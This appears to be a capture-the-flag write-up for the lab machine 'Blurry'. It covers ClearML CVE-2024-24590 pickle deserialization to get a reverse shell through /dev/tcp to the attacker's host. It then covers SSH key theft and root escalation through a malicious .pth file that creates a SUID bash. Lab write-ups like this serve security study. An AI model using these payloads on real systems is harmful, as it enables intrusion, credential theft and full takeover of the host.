## **Summary**

A vulnerability on th ClearML suite ([CVE-2024-24590](https://nvd.nist.gov/vuln/detail/CVE-2024-24590)) was exploited to get remote code execution on the machine, once in a binary that can be run using sudo without a password (`/usr/bin/evaluate_model`) was exploited using `evil_pth` tool to gain a shell as root.

## **Enumeration**

### **nmap**

Started with port scanning wich reveled two open ports 22 and 80.

```
$ nmap 10.10.11.19 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 18:47 +01
...
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
```

### **http - port 80**

Browsing to http://10.10.11.19/ redirects to http://app.blurry.htb/, so we added this line to `/etc/hosts`
```
10.10.11.19	app.blurry.htb
```
The home page contains in input where we can insert a `Full Name`.

> You can insert anything you want, it's not being validated.
{: .prompt-info}

After entring a name, we got redirected to a dashboard where we could open an existing project or create a new one by clicking on `NEW PROJECT`.

![](/assets/blurry/01.png)

We opened a project name `Black Swan`, then went to `EXPEREMENTS`, and hit the `+` button to add a new one.

We followed the instructions presented on the screen by first installing `clearml`, then running the setup script.

```bash
pip install clearml
clearml-init
```

We were prompted to enter some configuration, we obtained them by clicking on `CREATE NEW CREDENTIALS` in the instructions page.

We got this JSON like object.

We had to change the `api_server` to `http://app.blurry.htb/api`. We copied the whole object to our terminal where we ran `clearml-init`.

```
api {
  web_server: http://app.blurry.htb
  api_server: http://app.blurry.htb/api
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "QHGOU49DOVPL6NUJLVW9"
    "secret_key" = "KSQP3ZqOfHleWLjRUvJ9R5Saerx4Fr4AgDmdIXua6ZqFhgX6iJ"
  }
}
```

This script created a config file `clearml.conf` in our home directory.

## **Initial access**

`clearml` is vulnerable to Deserialization of Untrusted Data wich leads to remote code execution, more details can be found [HERE](https://security.snyk.io/vuln/SNYK-PYTHON-CLEARML-6230390).

To exploit this vulnerability we created the following script `exploit.py`.

> This script uploads an artifact in the form of a pickle file, when deserialized it will give us a reverse shell.
{: .prompt-info}

```python
from clearml import Task
import pickle, os

class RunCommand:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i /dev/tcp/10.10.14.65/9000 0>&1'",))

command = RunCommand()

task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
```

We started a listener.
```
$ nc -lnvp 9000
```

Then ran our script.
```
$ python exploit.py
```

After a short period of time, we received a connection.

> It will take a while to establish a reverse shell after executing the script, just be patiant.
{: .prompt-info}

We extraced an ssh private key `/home/jippity/.ssh/id_rsa` and used it to access the machine via ssh.

```
$ chmod 600 id_rsa
$ ssh -i id_rsa jippity@10.10.11.19
```

## **Privilege escalation**

To excalate our privileges we found that the user `jippity` can execute the binary `evaluate_model` on every file in `/models/` directory with the extension `.pth` as root without the need of a password.

```
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

We used `evil_pth` to create a malicous `pth` file that will give command execution as root.

```
$ wget https://raw.githubusercontent.com/duck-sec/pytorch-evil-pth/master/evil_pth.py
$ scp -i id_rsa evil_pth.py jippity@10.10.11.19:/tmp/hrh/
evil_pth.py                                                                        100% 1006    15.7KB/s   00:00
```

We created a malicious `pth` file, that will copy `/bin/sh` and add the SUID bit to it.
```
$ python3 evil_pth.py 'cp /bin/bash /tmp/hrh/sh && chmod u+s /tmp/hrh/sh'
```

Copied it to `/models/`, then ran `/usr/bin/evaluate_model`.
```
$ cp evil_model.pth /models/hrh.pth
$ sudo /usr/bin/evaluate_model /models/hrh.pth
$ ls -l sh
-rwsr-xr-x 1 root root 1234376 Jun 16 06:24 sh
```

Now that we have our `sh` with SUID bit set, we can start a shell as root.

```
$ ./sh -p
sh-5.1# id
uid=1000(jippity) gid=1000(jippity) euid=0(root) groups=1000(jippity)
```
